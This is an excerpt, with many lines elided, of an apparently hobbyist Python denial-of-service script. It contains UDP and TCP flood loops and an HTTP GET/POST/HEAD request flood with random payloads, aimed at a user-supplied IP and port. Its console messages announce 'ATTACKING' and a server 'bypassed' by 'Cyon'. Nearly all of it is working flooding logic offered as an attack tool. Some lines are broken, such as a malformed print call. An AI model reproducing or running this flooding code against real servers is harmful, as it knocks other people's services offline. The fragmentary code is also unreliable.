	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[0;37;40m valen nih bos ip %s \033[33mport %s"%(ip,port))
		except:
			print("\033[0;37;40m valen nih bos ip %s port %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m Icha Attacking ip %s port %s"%(ip,port))
...
def Headers(method):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Bypassed_By_Cyon HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['D'])+ " & cls & title Cyon [ ATTACKING!!]")
def get():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(90048)
    if choice == "1":
        get_host = "GET /Your_Server_Bypassed_By_Cyon HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Bypassed_By_Cyon HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ...
            for x in range(time):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("\033[1;36;40m Icha Attacking ip %s port %s"%(ip,port))
        except socket.error:
            s.close()
            print("\033[1;36;40m Icha Attacking ip %s port %s"%(ip,port))
